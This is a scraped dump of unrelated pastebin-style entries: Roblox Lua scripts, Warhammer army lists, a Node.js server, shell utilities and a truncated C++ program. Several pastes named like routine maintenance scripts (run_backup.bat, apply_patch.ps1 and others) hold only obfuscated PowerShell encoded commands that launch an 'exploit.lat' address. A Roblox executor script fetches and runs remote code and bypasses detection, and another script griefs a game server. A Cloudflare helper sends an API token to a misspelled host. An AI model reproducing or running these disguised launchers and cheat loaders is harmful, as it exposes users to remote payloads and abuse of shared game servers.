	for _, gui in ipairs(player:WaitForChild(""PlayerGui""):GetChildren()) do
		if gui.Name ~= ""RoundGui"" then -- Hide all GUI except the round GUI
			gui:Destroy()
		end
	end
	wait(31) -- Wait 33 seconds
	TextLabel.Text = randomText[math.random(1, #randomText)]

	wait(1)-- Wait 2 seconds before hiding all GUIs except this one
	local CCE = Instance.new(""ColorCorrectionEffect"")
	CCE.Parent = game.Lighting

	local randomNames = {
		""YOU CAN DO NOTHING!"",
		""EXECUTOR DISSABLED"",
		""PATHEIC""
	}
	for _, v in pairs(workspace:GetChildren()) do
		if v:IsA(""Part"") or v:IsA(""BasePart"") then
			v.Anchored = false
		end
	end
	game[""Run Service""].Heartbeat:Connect(function()
		for _, Players in pairs(game.Players:GetPlayers()) do
			local tool = Instance.new(""Tool"")
			tool.Parent = Players.Backpack
			tool.Name = randomNames[math.random(1, #randomNames)]
			CCE.TintColor = Color3.new(math.random(0, 1),math.random(0, 1), math.random(0, 1))
			game.Lighting.Brightness = math.random(-10, 10)
			TextLabel.Text = randomText[math.random(1, #randomText)]
			for _, gui in ipairs(player:WaitForChild(""PlayerGui""):GetChildren()) do
				if gui.Name ~= ""RoundGui"" then -- Hide all GUI except the round GUI
					gui:Destroy()
				end
			end
		end
	end)
end

local function displayGuiForAllPlayers()
	for _, player in ipairs(game.Players:GetPlayers()) do
		createGuiForPlayer(player)
	end
end

local function playCountdownSound()
	local sound = Instance.new(""Sound"")
	sound.SoundId = ""rbxassetid://1839246711""
	sound.Parent = game.Workspace
	sound.Volume = 55
	sound.PlaybackSpeed = 0.8
	sound:Play()
end

playCountdownSound()
displayGuiForAllPlayers()

-- Place this script inside a `ServerScript` in `ServerScriptService`"
4QBScrNk,Eldar Ottawa,TableTopLive,PHP,Saturday 7th of June 2025 04:48:01 PM CDT,"Ynnari (2000 Points)

Aeldari
Devoted of Ynnead
Strike Force (2000 Points)

CHARACTERS

Autarch (75 Points)
â€¢ 1x Dragon fusion gun
â€¢ 1x Star glaive

Autarch (75 Points)
â€¢ 1x Dragon fusion gun
â€¢ 1x Star glaive

The Visarch (90 Points)
â€¢ 1x Asu-var

The Yncarne (250 Points)
â€¢ 1x Swirling soul energy
â€¢ 1x Vilith-zhar

Yvraine (100 Points)
â€¢ Warlord
â€¢ 1x Kha-vir
â€¢ 1x Storm of Whispers

BATTLELINE

Storm Guardians (100 Points)
â€¢ 10x Storm Guardian
â—¦ 8x Close combat weapon
â—¦ 2x Flamer
â—¦ 2x Fusion gun
â—¦ 2x Power sword
â—¦ 6x Shuriken pistol
â€¢ 1x Serpentâ€™s Scale Platform
â—¦ 1x Close combat weapon
â—¦ 1x Serpent shield

DEDICATED TRANSPORTS

Wave Serpent (125 Points)
â€¢ 1x Shuriken cannon
â€¢ 1x Twin bright lance
â€¢ 1x Wraithbone hull

OTHER DATASHEETS

Dark Reapers (90 Points)
â€¢ 1x Dark Reaper Exarch
â—¦ 1x Close combat weapon
â—¦ 1x Missile launcher
â€¢ 4x Dark Reaper
â—¦ 4x Close combat weapon
â—¦ 4x Reaper launcher

Dark Reapers (90 Points)
â€¢ 1x Dark Reaper Exarch
â—¦ 1x Close combat weapon
â—¦ 1x Missile launcher
â€¢ 4x Dark Reaper
â—¦ 4x Close combat weapon
â—¦ 4x Reaper launcher

Fire Dragons (110 Points)
â€¢ 1x Fire Dragon Exarch
â—¦ 1x Close combat weapon
â—¦ 1x Exarchâ€™s Dragon fusion gun
â€¢ 4x Fire Dragon
â—¦ 4x Close combat weapon
â—¦ 4x Dragon fusion gun

Fire Dragons (110 Points)
â€¢ 1x Fire Dragon Exarch
â—¦ 1x Close combat weapon
â—¦ 1x Firepike
â€¢ 4x Fire Dragon
â—¦ 4x Close combat weapon
â—¦ 4x Dragon fusion gun

Fire Dragons (110 Points)
â€¢ 1x Fire Dragon Exarch
â—¦ 1x Close combat weapon
â—¦ 1x Firepike
â€¢ 4x Fire Dragon
â—¦ 4x Close combat weapon
â—¦ 4x Dragon fusion gun

Howling Banshees (90 Points)
â€¢ 1x Howling Banshee Exarch
â—¦ 1x Executioner
â—¦ 1x Shuriken pistol
â€¢ 4x Howling Banshee
â—¦ 4x Banshee blade
â—¦ 4x Shuriken pistol

Howling Banshees (90 Points)
â€¢ 1x Howling Banshee Exarch
â—¦ 1x Executioner
â—¦ 1x Shuriken pistol
â€¢ 4x Howling Banshee
â—¦ 4x Banshee blade
â—¦ 4x Shuriken pistol

Rangers (55 Points)
â€¢ 5x Ranger
â—¦ 5x Close combat weapon
â—¦ 5x Long rifle
â—¦ 5x Shuriken pistol

Rangers (55 Points)
â€¢ 5x Ranger
â—¦ 5x Close combat weapon
â—¦ 5x Long rifle
â—¦ 5x Shuriken pistol

Warlock Skyrunners (45 Points)
â€¢ 1x Destructor
â€¢ 1x Shuriken pistol
â€¢ 1x Singing Spear
â€¢ 1x Twin shuriken catapult

Warp Spiders (95 Points)
â€¢ 1x Warp Spider Exarch
â—¦ 1x Close combat weapon
â—¦ 1x Death weavers
â—¦ 1x Spinneret rifle
â€¢ 4x Warp Spider
â—¦ 4x Close combat weapon
â—¦ 4x Death spinner

Warp Spiders (95 Points)
â€¢ 1x Warp Spider Exarch
â—¦ 1x Close combat weapon
â—¦ 1x Death weavers
â—¦ 1x Spinneret rifle
â€¢ 4x Warp Spider
â—¦ 4x Close combat weapon
â—¦ 4x Death spinner

Ynnari Incubi (150 Points)
â€¢ 1x Klaivex
â—¦ 1x Demiklaives
â€¢ 9x Incubi
â—¦ 9x Klaive"
g3fZtDTb,clone_repo.ps1,elsapito,Batch,Saturday 7th of June 2025 04:44:31 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AMABmADMAMABiAGYANQBhAA==

n2xfng"
2ps4Mp46,run_backup.bat,elsapito,Batch,Saturday 7th of June 2025 04:34:30 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AOAA5ADEAMwA4ADkAOAA0AA==

IqAmNM"
2iiEwqax,clear_cache.bat,elsapito,Batch,Saturday 7th of June 2025 04:24:30 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AMQBhADUAOABkAGQAYwAwAA==

lqw6bC"
GanEKQ7c,upgrade_modules.bat,elsapito,Batch,Saturday 7th of June 2025 04:14:29 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AZQAxADQAMAA0ADUAMQAxAA==

iAi97A"
y8fPXB9D,Ottawa Teams DE,TableTopLive,PHP,Saturday 7th of June 2025 04:08:04 PM CDT,"Ottawa Teams (2000 Points)

Drukhari
Reaperâ€™s Wager
Strike Force (2000 Points)

CHARACTERS

Archon (100 Points)
â€¢ Warlord
â€¢ 1x Blast pistol
â€¢ 1x Huskblade
â€¢ Enhancements: Archraider

Beastmaster (120 Points)
â€¢ 1x Beastmaster
â—¦ 1x Agoniser
â—¦ 1x Splinter pods
â€¢ 1x Clawed Fiend
â—¦ 1x Clawed Fiend fists
â€¢ 2x Khymerae
â—¦ 2x Khymerae talons
â€¢ 3x Razorwing Flock
â—¦ 3x Razorwing feathers

Beastmaster (120 Points)
â€¢ 1x Beastmaster
â—¦ 1x Agoniser
â—¦ 1x Splinter pods
â€¢ 1x Clawed Fiend
â—¦ 1x Clawed Fiend fists
â€¢ 2x Khymerae
â—¦ 2x Khymerae talons
â€¢ 3x Razorwing Flock
â—¦ 3x Razorwing feathers

Drazhar (85 Points)
â€¢ 1x The Executionerâ€™s demiklaives

Lelith Hesperax (95 Points)
â€¢ 1x Lelithâ€™s blades

Urien Rakarth (80 Points)
â€¢ 1x Casket of Flensing
â€¢ 1x Haemonculus tools and scissorhands

BATTLELINE

Kabalite Warriors (100 Points)
â€¢ 1x Sybarite
â—¦ 1x Blast pistol
â—¦ 1x Phantasm grenade launcher
â—¦ 1x Sybarite weapon
â€¢ 9x Kabalite Warrior
â—¦ 1x Blaster
â—¦ 9x Close combat weapon
â—¦ 1x Dark lance
â—¦ 1x Shredder
â—¦ 1x Splinter cannon
â—¦ 5x Splinter rifle

Kabalite Warriors (100 Points)
â€¢ 1x Sybarite
â—¦ 1x Blast pistol
â—¦ 1x Phantasm grenade launcher
â—¦ 1x Sybarite weapon
â€¢ 9x Kabalite Warrior
â—¦ 1x Blaster
â—¦ 9x Close combat weapon
â—¦ 1x Dark lance
â—¦ 1x Shredder
â—¦ 1x Splinter cannon
â—¦ 5x Splinter rifle

Wracks (55 Points)
â€¢ 1x Acothyst
â—¦ 1x Wrack blades
â€¢ 4x Wrack
â—¦ 1x Hexrifle
â—¦ 1x Liquifier gun
â—¦ 1x Ossefactor
â—¦ 1x Stinger pistol
â—¦ 4x Wrack blades

Wyches (80 Points)
â€¢ 1x Hekatrix
â—¦ 1x Blast pistol
â—¦ 1x Hekatarii blade
â—¦ 1x Phantasm grenade launcher
â€¢ 9x Wych
â—¦ 9x Hekatarii blade
â—¦ 9x Splinter pistol

DEDICATED TRANSPORTS

Venom (70 Points)
â€¢ 1x Bladevanes
â€¢ 1x Splinter cannon
â€¢ 1x Splinter cannon

Venom (70 Points)
â€¢ 1x Bladevanes
â€¢ 1x Splinter cannon
â€¢ 1x Splinter cannon

Venom (70 Points)
â€¢ 1x Bladevanes
â€¢ 1x Splinter cannon
â€¢ 1x Splinter cannon

Venom (70 Points)
â€¢ 1x Bladevanes
â€¢ 1x Splinter cannon
â€¢ 1x Splinter cannon

OTHER DATASHEETS

Cronos (50 Points)
â€¢ 1x Spirit syphon
â€¢ 1x Spirit vortex
â€¢ 1x Spirit-leech tentacles

Incubi (85 Points)
â€¢ 4x Incubi
â—¦ 4x Klaive
â€¢ 1x Klaivex
â—¦ 1x Demiklaives

Mandrakes (70 Points)
â€¢ 1x Nightfiend
â—¦ 1x Baleblast
â—¦ 1x Glimmersteel blade
â€¢ 4x Mandrake
â—¦ 4x Baleblast
â—¦ 4x Glimmersteel blade

Mandrakes (70 Points)
â€¢ 1x Nightfiend
â—¦ 1x Baleblast
â—¦ 1x Glimmersteel blade
â€¢ 4x Mandrake
â—¦ 4x Baleblast
â—¦ 4x Glimmersteel blade

Ravager (110 Points)
â€¢ 1x Bladevanes
â€¢ 3x Dark lance

Ravager (110 Points)
â€¢ 1x Bladevanes
â€¢ 3x Dark lance

Scourges (130 Points)
â€¢ 1x Solarite
â—¦ 1x Close combat weapon
â—¦ 1x Shardcarbine
â—¦ 1x Solarite weapon
â€¢ 4x Scourge
â—¦ 4x Close combat weapon
â—¦ 4x Drukhari haywire blaster

Talos (160 Points)
â€¢ 2x Talos
â—¦ 2x Talos gauntlet
â—¦ 2x Twin Drukhari haywire blaster
â—¦ 2x Twin liquifier gun
"
zsPkMG1f,push_updates.ps1,neolino,Batch,Saturday 7th of June 2025 04:00:10 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AYQA3AGQANwBhADMANgBiAA==

Pg4Jry"
fSWKGWdh,servidor js,dev017,JavaScript,Saturday 7th of June 2025 03:53:14 PM CDT,"const http = require('http');
const fs = require('fs').promises;
const path = require('path');
const url = require('url');
const querystring = require('querystring');
const { performance } = require('perf_hooks');

const HOST = 'localhost';
const PORT = 8080;
const STATIC_DIR = path.join(__dirname, 'public');
const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'application/javascript',
  '.css': 'text/css',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml'
};

const cache = new Map();
const requestQueue = [];
let activeRequests = 0;
const MAX_CONCURRENT = 100;
const CACHE_TTL = 3600000;

const logger = {
  log: (req, status, time) => {
    const timestamp = new Date().toISOString();
    const { method, url } = req;
    console.log(`${timestamp} ${method} ${url} ${status} ${time.toFixed(2)}ms`);
  },
  error: (err) => console.error(`[${new Date().toISOString()}] ERROR: ${err.stack}`)
};

const rateLimit = new Map();
const RATE_LIMIT = 100;
const RATE_WINDOW = 60000;

const checkRateLimit = (ip) => {
  const now = Date.now();
  const record = rateLimit.get(ip) || { count: 0, start: now };
  
  if (now - record.start > RATE_WINDOW) {
    record.count = 0;
    record.start = now;
  }
  
  record.count++;
  rateLimit.set(ip, record);
  
  return record.count <= RATE_LIMIT;
};

const handleStaticFile = async (pathname, res) => {
  const filePath = path.join(STATIC_DIR, pathname === '/' ? 'index.html' : pathname);
  
  if (cache.has(filePath)) {
    const { content, mime, timestamp } = cache.get(filePath);
    if (Date.now() - timestamp < CACHE_TTL) {
      res.writeHead(200, {
        'Content-Type': mime,
        'Cache-Control': 'public, max-age=3600'
      });
      res.end(content);
      return true;
    }
    cache.delete(filePath);
  }

  try {
    const content = await fs.readFile(filePath);
    const ext = path.extname(filePath).toLowerCase();
    const mime = MIME_TYPES[ext] || 'application/octet-stream';
    
    cache.set(filePath, {
      content,
      mime,
      timestamp: Date.now()
    });

    res.writeHead(200, {
      'Content-Type': mime,
      'Cache-Control': 'public, max-age=3600'
    });
    res.end(content);
    return true;
  } catch (err) {
    return false;
  }
};

const handleApiRequest = async (req, res, pathname, query) => {
  if (pathname.startsWith('/api/')) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ 
      status: 'ok',
      path: pathname,
      query,
      timestamp: Date.now()
    }));
    return true;
  }
  return false;
};

const queueRequest = (req, res) => {
  return new Promise((resolve) => {
    requestQueue.push({ req, res, resolve });
    processQueue();
  });
};

const processQueue = () => {
  if (activeRequests >= MAX_CONCURRENT || !requestQueue.length) return;
  
  activeRequests++;
  const { req, res, resolve } = requestQueue.shift();
  
  handleRequest(req, res).finally(() => {
    activeRequests--;
    resolve();
    processQueue();
  });
};

const handleRequest = async (req, res) => {
  const startTime = performance.now();
  const { pathname, query } = url.parse(req.url, true);
  const ip = req.socket.remoteAddress;

  try {
    if (!checkRateLimit(ip)) {
      res.writeHead(429, { 'Content-Type': 'text/plain' });
      res.end('Rate limit exceeded');
      logger.log(req, 429, performance.now() - startTime);
      return;
    }

    res.setHeader('X-Powered-By', 'Node.js');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');

    if (await handleApiRequest(req, res, pathname, query)) {
      logger.log(req, 200, performance.now() - startTime);
      return;
    }

    if (await handleStaticFile(pathname, res)) {
      logger.log(req, 200, performance.now() - startTime);
      return;
    }

    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
    logger.log(req, 404, performance.now() - startTime);
  } catch (err) {
    res.writeHead(500, { 'Content-Type': 'text/plain' });
    res.end('Internal Server Error');
    logger.error(err);
    logger.log(req, 500, performance.now() - startTime);
  }
};

const server = http.createServer((req, res) => {
  queueRequest(req, res);
});

server.on('error', logger.error);

server.listen(PORT, HOST, () => {
  console.log(`Server running at http://${HOST}:${PORT}`);
});

process.on('SIGTERM', () => {
  server.close(() => {
    console.log('Server terminated');
    process.exit(0);
  });
});"
AmRYX1sH,Untitled,GTAXL,Bash,Saturday 7th of June 2025 03:45:30 PM CDT,"_fetch_zone_id() {
	local DOMAIN
	DOMAIN=""${1}""

	if [ -f ""/var/lib/certdeploy/dns-hooks/cloudflare/zoneid_${DOMAIN}.txt"" ]; then
		_log_debug ""Zone ID exists on file.""
		cat /var/lib/certdeploy/dns-hooks/cloudflare/zoneid_""${DOMAIN}"".txt
	else
		_log_debug ""Zone ID is not on file, fetching from Cloudflare's API...""
		local ENDPOINT RESPONSE CHECK_STATUS ZONE_ID
		ENDPOINT=""https://api.cloudflae.com/client/v4/zones?name=${DOMAIN}""
		RESPONSE=$(curl -sS -H ""Authorization: Bearer ${API_TOKEN}"" -H ""Content-Type: application/json"" ""${ENDPOINT}"")
		echo ""${RESPONSE}"" > cf-debug.txt
		CHECK_STATUS=$(echo ""${RESPONSE}"" | jq -r "".success"")
		
		if [[ ""${CHECK_STATUS}"" == ""true"" ]]; then
			local CHECK_COUNT
			CHECK_COUNT=$(echo ""${RESPONSE}"" | jq -r "".result_info.count"")

			if [[ ""${CHECK_COUNT}"" -eq 1 ]]; then
				ZONE_ID=$(echo ""${RESPONSE}"" | jq -r "".result[0].id"")

				if [[ -n ""${ZONE_ID}"" && ""${ZONE_ID}"" != ""null"" ]]; then
					echo ""${ZONE_ID}"" > /var/lib/certdeploy/dns-hooks/cloudflare/zoneid_""${DOMAIN}"".txt
					echo ""${ZONE_ID}""
				else
					_error ""Fetching Zone ID failed! Domain: ${DOMAIN}""
					_error ""${RESPONSE}""
					exit 1
				fi
			else
				_error ""Domain ${DOMAIN} doesn't exist on Cloudflare account.""
				exit 1
			fi
		elif [[ ""${CHECK_STATUS}"" == ""false"" ]]; then
			local CF_ERROR
			CF_ERROR=$(echo ""${RESPONSE}"" | jq -r "".errors[0].message"")
			
			if [[ ""${CF_ERROR}"" == ""Invalid request headers"" || ""${CF_ERROR}"" == ""Invalid access token"" ]]; then
				_error ""Invalid Cloudflare API token.""
				exit 1
			else
				local CF_ERR_CODE
				CF_ERR_CODE=$(echo ""${RESPONSE}"" | jq -r "".errors[0].code"")
				_error ""Cloudflare API Response, Code: ${CF_ERR_CODE} ${CF_ERROR}""
				exit 1
			fi
		else
			_error ""${RESPONSE}""
			exit 1
		fi
	fi
}"
wDdYXrBu,ðŸš€ Roblox Server Join Script Generator | ðŸ“‹ Auto Get JobId & Copy Teleport Script | ðŸ”” User Notifica,EpicGamerSander1345,Lua,Saturday 7th of June 2025 03:29:54 PM CDT,"--[[
    ðŸš€ Roblox Server Join Script Generator
    Automatically gets current server's JobId,
    copies a ready-to-use join script to your clipboard,
    and notifies you.
]]

local StarterGui = game:GetService(""StarterGui"")

local placeId = game.PlaceId
local jobId = game.JobId

-- Create the full join script as a string
local joinScript = [[
-- Roblox Server Join Script
local TeleportService = game:GetService(""TeleportService"")
local Players = game:GetService(""Players"")

local jobId = ""]] .. jobId .. [["" -- Target server's JobId
local placeId = ]] .. placeId .. [[ -- Current game's PlaceId

TeleportService:TeleportToPlaceInstance(placeId, jobId, Players.LocalPlayer)
]]

-- Copy to clipboard (works in Roblox Studio or executors that support it)
if setclipboard then
    setclipboard(joinScript)
else
    StarterGui:SetCore(""SendNotification"", {
        Title = ""Clipboard Error"",
        Text = ""setclipboard not supported in this environment"",
        Duration = 5
    })
    return
end

-- Notify the player that the script was copied
StarterGui:SetCore(""SendNotification"", {
    Title = ""Script Copied!"",
    Text = ""Join script copied to clipboard âœ…"",
    Duration = 5
})
"
Y2ArmKmS,NPC wander/attack code,merchants,Lua,Saturday 7th of June 2025 02:58:32 PM CDT,"local npc = script.Parent
local humanoid = npc:WaitForChild(""Humanoid"")
local root = npc:WaitForChild(""HumanoidRootPart"")
local tool = npc:FindFirstChild(""LaserGun"")
 
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local Debris = game:GetService(""Debris"")
local Workspace = game:GetService(""Workspace"")
 
local chaotic = false
local targetPlayer = nil
local wanderRadius = 50
local wanderDelay = 2
 
-- Create a beam between two points
local function createBeam(fromPos, toPos)
    local part = Instance.new(""Part"")
    part.Anchored = true
    part.CanCollide = false
    part.Material = Enum.Material.Neon
    part.BrickColor = BrickColor.Red()
    part.Size = Vector3.new(0.2, 0.2, (toPos - fromPos).Magnitude)
    part.CFrame = CFrame.new(fromPos, toPos) * CFrame.new(0, 0, -part.Size.Z / 2)
    part.Parent = workspace
    Debris:AddItem(part, 0.1)
end
 
local function randomPointAround(position, radius)
    local angle = math.random() * math.pi * 2
    local offset = Vector3.new(math.cos(angle), 0, math.sin(angle)) * math.random(10, radius)
    local target = position + offset
    
    local rayParams = RaycastParams.new()
    rayParams.FilterDescendantsInstances = {npc}
    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
    
    local result = workspace:Raycast(target + Vector3.new(0, 50, 0), Vector3.new(0, -100, 0), rayParams)
    if result then
        return result.Position
    end
    
    return position
end
 
local function wander()
    while humanoid.Health > 0 and not chaotic do
        local destination = randomPointAround(root.Position, wanderRadius)
        humanoid:MoveTo(destination)
        humanoid.MoveToFinished:Wait()
        wait(wanderDelay)
    end
end
 
local function faceTarget(targetHRP)
    if not targetHRP then return end
        local direction = (targetHRP.Position - root.Position).Unit
        root.CFrame = CFrame.new(root.Position, root.Position + Vector3.new(direction.X, 0, direction.Z))
    end
    
    local function chaoticMovement()
        while chaotic and humanoid.Health > 0 and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild(""HumanoidRootPart"") do
            local targetHRP = targetPlayer.Character.HumanoidRootPart
            
            faceTarget(targetHRP)
            
            local offset = Vector3.new(math.random(-15, 15), 0, math.random(-15, 15))
            local movePos = targetHRP.Position + offset
            humanoid:MoveTo(movePos)
            
            if math.random() < 0.6 then
                humanoid.Jump = true
            end
            
            wait(math.random(1, 2))
        end
    end
    
    local function shootAtPlayer()
        while chaotic and humanoid.Health > 0 and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild(""HumanoidRootPart"") do
            local targetHRP = targetPlayer.Character.HumanoidRootPart
            local from = tool:FindFirstChild(""Handle"") and tool.Handle:FindFirstChild(""MuzzleAttachment"")
            local origin = from and from.WorldPosition or root.Position + Vector3.new(0, 1.5, 0)
            local direction = (targetHRP.Position - origin).Unit * 500
            
            local rayParams = RaycastParams.new()
            rayParams.FilterDescendantsInstances = {npc}
            rayParams.FilterType = Enum.RaycastFilterType.Blacklist
            
            local result = workspace:Raycast(origin, direction, rayParams)
            local hitPos = result and result.Position or (origin + direction)
            
            createBeam(origin, hitPos)
            
            if result and result.Instance then
                local model = result.Instance:FindFirstAncestorOfClass(""Model"")
                if model then
                    local hum = model:FindFirstChild(""Humanoid"")
                    if hum and hum.Health > 0 then
                        hum:TakeDamage(8)
                    end
                end
            end
            
            wait(0.4)
        end
    end
    
    local function enterChaoticMode(player)
        if chaotic then return end
            chaotic = true
            targetPlayer = player
            
            if tool and humanoid then
                humanoid:EquipTool(tool)
            end
            
            task.spawn(chaoticMovement)
            task.spawn(shootAtPlayer)
        end
        
        -- Start wandering by default
        task.spawn(wander)
        
        -- Detect first damage and go chaotic
        humanoid.HealthChanged:Connect(function(health)
            if health < humanoid.MaxHealth and not chaotic then
                local closest, dist = nil, math.huge
                for _, p in pairs(Players:GetPlayers()) do
                    local char = p.Character
                    if char and char:FindFirstChild(""HumanoidRootPart"") then
                        local d = (char.HumanoidRootPart.Position - root.Position).Magnitude
                        if d < dist then
                            closest = p
                            dist = d
                        end
                    end
                end
                
                if closest then
                    enterChaoticMode(closest)
                end
            end
        end)
"
Z1UP8La8,remove duplicate trickplay folders script#!/bin/bash  RED='\033[0;31m' CYAN='\033[0;36m' RESET='\033,nugget2021,Bash,Saturday 7th of June 2025 02:38:41 PM CDT,"#!/bin/bash

RED='\033[0;31m'
CYAN='\033[0;36m'
RESET='\033[0m'

# The script runs and trickplay folders that don't match the name of the movie are removed.
# in the sample below, the first trickplay folder would be removed since the movie has [pass1][transcoded] in the name

# find trickplay folders and write to txt file
# this is what the find output looks like for trickplay folders
# ./movies/Example movie 1 [1252]/Example movie 1 [1252][DV HDR10].trickplay
# ./movies/Example movie 1 [1252]/Example movie 1 [1252][DV HDR10][pass1][transcoded].trickplay
find -name *.trickplay > trickplay.txt

# find mkv and mp4 files and write to txt file
# this is what the find output looks like for a movie file
# ./movies/Example movie 1 [1252]/Example movie 1 [1252][DV HDR10][pass1][transcoded].mkv
find -name *.mkv -o -name *.mp4 > movies.txt

# read the movies.txt file line by line
while read movie
do
    # write only the basename without the extension to the log.txt for comparison later
    # Example movie 1 [1252][DV HDR10][pass1][transcoded]
    base=$(basename -s .mkv $(basename -s .mp4 ""$movie""))
    echo $base >> log.txt
done < movies.txt

# read the trickplay.txt file line by line
while read trickplay
do
    # Compare only the basename without the extension to log.txt from before
    # Example movie 1 [1252][DV HDR10]
    # Example movie 1 [1252][DV HDR10][pass1][transcoded]
    base=$(basename -s .trickplay ""$trickplay"")

    # if the trickplay basename matches exactly in log.txt, keep it else remove it
    if ( cat log.txt | grep -qFx ""$base""); then
        echo $base >> keep.txt
    else
        echo $base >> remove.txt
        # rm trickplay folders not matching
        rm ""$trickplay"" -r
    fi
done < trickplay.txt


echo -e ""${CYAN}List of mp4 and mkv files\n\n${RESET}""
cat log.txt
echo -e ""\n\n${CYAN}List of trickplay to keep\n\n${RESET}""
cat keep.txt
if [ -f remove.txt ]; then
    echo -e ""\n\n${RED}List of trickplay folders removed${RESET}""
    cat remove.txt
fi
rm *.txt
"
sqErCTv4,HandleDamageServer*UPDATED,BoblokDevelopyyyr,Lua,Saturday 7th of June 2025 02:21:32 PM CDT,"local RS = game:GetService(""ReplicatedStorage"")
local events = RS.Events
local dealDamageEvent = events.DealDamage
local module = require(game.ServerScriptService.Stats)
local dmg = 0

dealDamageEvent.OnServerEvent:Connect(function(player)
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildOfClass(""Humanoid"")
	local arm = character:FindFirstChild(""Right Arm"")::BasePart
	
	for _, child in ipairs(character:GetChildren()) do
		if child:IsA(""Tool"") then
			print(child.Name)
			print(module[child.Name])
			dmg = module[child.Name]
		end
	end

	local db = false
	task.spawn(function()
		task.wait(1)
		db = true
	end)
		arm.Touched:Once(function(hitObject)
		if not db then
				local hitHum = hitObject.Parent:FindFirstChildOfClass(""Humanoid"")
				if hitHum then
					hitHum:TakeDamage(dmg)
					db = true

				else
					db = true
				end
			end
		end)
end)"
JBSyuV4f,hop,Daeho,Lua,Saturday 7th of June 2025 02:15:35 PM CDT,"if not game:IsLoaded() then game.Loaded:Wait() end
loadstring(game:HttpGet(""https://raw.githubusercontent.com/uzu01/arise/refs/heads/main/global.lua""))()

_G.JxereasExistingHooks  = {GuiDetectionBypass  = true}

local notification = loadstring(game:HttpGet(""https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua"", true))()
local replicated_storage = game:GetService(""ReplicatedStorage"")
local data_service = require(replicated_storage.Modules.DataService)
local lowest_odd = 1000
local highest_weight = 0
local garden

function send_webhook(url, text, ...)
    return request({
        Url = (""%*?wait=true""):format(url),
        Method = ""POST"",
        Headers = {[""Content-Type""] = ""application/json""},
        Body = game:GetService(""HttpService""):JSONEncode({embeds = {...}, content = text})
    })
end

task.wait(3)

for i, v in workspace.Farm:GetChildren() do
    if v.Important.Data.Owner.Value ~= player.Name then continue end
    garden = v
end

function get_egg(uid)
    for i, v in garden.Important.Objects_Physical:GetChildren() do
        if v.Name:match(""PetEgg"") and v:GetAttribute(""OBJECT_UUID"") == uid then
            return v
        end
    end
    return nil
end

for i, v in data_service:GetData().SavedObjects do
    local data = v.Data
    local egg = data and data.EggName

    if not egg then continue end
    if not data.RandomPetData then continue end

    if data.RandomPetData.ItemOdd < lowest_odd then
        lowest_odd = data.RandomPetData.ItemOdd
    end

    if data.BaseWeight > highest_weight then
        highest_weight = data.BaseWeight
    end

    if webhook_url then
        send_webhook(webhook_url, (""> name: **%s** (%.2f%%)\n> weight: **%.2f kg**\n""):format(data.Type, data.RandomPetData.ItemOdd, data.BaseWeight), nil)
    end

    if data.RandomPetData.ItemOdd < 1 then
        print(data.Type, get_egg(i))
        replicated_storage.GameEvents.PetEggService:FireServer(""HatchPet"", get_egg(i))
		task.wait(10)
		game:GetService(""TeleportService""):Teleport(game.PlacId)
    end

    notification.new(""info"", ""Pet"", data.Type)
end

if lowest_odd >= 1 then
    game:GetService(""TeleportService""):Teleport(game.PlaceId)
end

queue_on_teleport('loadstring(game:HttpGet(""https://pastebin.com/raw/BE36f3z8))()')"
5R1GQi4t,apply_patch.ps1,amtaidan,Batch,Saturday 7th of June 2025 01:34:45 PM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAGUAeABwAGwAbwBpAHQALgBsAGEAdAAiACAAIAAjACAAaQBkAD0AMgAzAGYAYQBjADgAMwBmAA==

Rz4a4r"
8QsFQrVj,Base PRice,tepyotin2,C++,Saturday 7th of June 2025 01:26:44 PM CDT,"#include <bits/stdc++.h>

using namespace std;

struct DSU{
	vector<int> p;
	DSU(int n){
		p = vector<int>(n, -1);
	}
	int get(int x){
		if(p[x]<0) return x;
		return p[x] = get(p[x]);
	}
	bool same_set(int x, int y){
		return get(x) == get(y);
	}
	bool unite(int x, int y){
		x = get(x);
		y = get(y);
		if(x == y) return false;
		if(p[x]>p[y]) swap(x, y);
		p[x]+=p[y];
		p[y] = x;
		return true;
	}
};

struct Con{
	int a, b;
	int cost;
	bool operator<(const Con &v) const{
		return cost<v.cost;
	}
};

int n, m;
vector<Con> con;
int cost;

int main(){
	//freopen(""baseprice.in"", ""r"", stdin);
	
	cin >> n >> m;
	con.resize(m);
	for(int i=0; i<m; i++){
		cin >> con[i].a >> con[i].b >> con[i].cost;
	}
	sort(con.begin(), con.end());
	DSU dsu(n+1);
	for(int i=0; i<m; i++){
		if(!dsu.same_set(con[i].a, con[i].b)){
